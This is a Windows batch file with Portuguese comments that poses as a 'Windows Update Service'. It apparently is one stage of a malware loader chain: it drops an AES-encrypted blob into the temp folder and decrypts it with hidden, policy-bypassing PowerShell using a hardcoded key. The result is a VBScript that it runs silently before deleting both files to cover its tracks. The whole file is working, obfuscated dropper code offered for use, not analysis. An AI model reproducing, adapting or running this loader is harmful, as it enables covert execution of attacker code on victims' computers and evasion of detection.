@echo off
setlocal EnableDelayedExpansion
title Windows Update Service

:: (A elevacao ja foi feita pelo VBS loader antes de chamar este .bat)

echo [*] Inicializando componentes...

set "nS5G0a=%TEMP%\d9coG.txt"
set "nC4Pg6=%TEMP%\TSU9X.vbs"

:: Salva os dados criptografados em um arquivo de texto
echo I9ojH12L7JIe00fLvb4B5Y/UjLOejzVkFpTxoen+teSEFYfCggH9RRdxxZqf04D8aRzTkDN1zdr2dxFrBd0ZAYoFAm6dH4hqwUXEuSs+dreshqRlbgrB1PE0fZ909o4N3yGF1WcJyTSHSciSeEyx3ah52ZMHXJnYWDvF4AisX3GlxY9zEsBTB14+dOc4vtuDUCQD46RTPZQGZuPDnAec97z6jknHkCqqzts7rzm1Qh1zWPvxEaNjnBVW7D0FoiFqbACTv5iyHwoqGA6YlfepX0SCSVy5uBYzl45RRIeuTgiZs4HnHwKIuuZkI47AGE9CtsVBL1UMbc1vpUbaPtyBdnRIKYS4ks/qCtlUbBhStMkrnr1YHqRrnzpGItPndrC03jRRq1+/Lm2/BX/ck0rob/z7CotxTvGSQR8nrwq1kx8Cx44Asbes7QOTtfQclWdEMk6Y1Y2SkmupbfddXq8L9Lf/u5qHPYcxUiqnxGPakFbANU5tGxN3rZP7utp2MA+J2U3bB19up66TqZSXoljGAEi5dodle10gt8yFYhT8iRBLNRp4T3UKnaaanM6Kvdk+Yo/V48IX/HrO4KL3UucVdA05xygHMLP5mQFmULX6EcSOCIi9UU68jkf6g46Tml0vN8t/dPPrfTrDa2tReoq0bG+lzFeeMqE6DnBQnnTK52LQLzTK+H9CqzKOAA9ZJY+zwE68Mjci1Ypi84mErT+LmN8pHBPeVc17tOzhnNzQIPQYmcahLecxc42XE4lJRJkM1xI5CYz27N0IgsQwsWBO3hvNGrfuesOAx1Uh/bXbtqmCnXorMj+vy424xYrggKiFOLbvgeZO8r/OXjj07H/+bnCgSYm9fF1x4pRNL4XCHFWhVNOWBOs37xOKeb6zcN+HVi2K/ouIDNvZBg3Y6Y1HbRJJ2XUA0o4QLUr7gGEOTfh2J9+RGDbTB6pCrc21jQ4y27fTBcNjlTQnS2cvLrKCxiRHuYuw6g9Isp8ei/37TgY= > "%nS5G0a%"

:: O PowerShell apenas descriptografa o VBS e salva no disco
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
    "$k=[Convert]::FromBase64String('zmH82QlKZy6j3TrcpOTwMEGq7cNiM32pa8TktktYPeQ=');" ^
    "$iv=[Convert]::FromBase64String('z1YKAUlq8xM2Fnc5irKzrg==');" ^
    "$d=[Convert]::FromBase64String((Get-Content -Raw -Path '%nS5G0a%'));" ^
    "$aes=[System.Security.Cryptography.Aes]::Create();" ^
    "$aes.Key=$k; $aes.IV=$iv;" ^
    "$dec=$aes.CreateDecryptor();" ^
    "$ms=New-Object System.IO.MemoryStream(,$d);" ^
    "$cs=New-Object System.Security.Cryptography.CryptoStream($ms,$dec,[System.Security.Cryptography.CryptoStreamMode]::Read);" ^
    "$sr=New-Object System.IO.StreamReader($cs);" ^
    "[System.IO.File]::WriteAllText('%nC4Pg6%', $sr.ReadToEnd());" ^
    "$cs.Close(); $ms.Close()"

:: Roda o VBScript silenciosamente
cscript //nologo //B "%nC4Pg6%"

:: Limpeza
ping -n 2 127.0.0.1 >nul
del /f /q "%nS5G0a%" >nul 2>&1
del /f /q "%nC4Pg6%" >nul 2>&1
exit /b
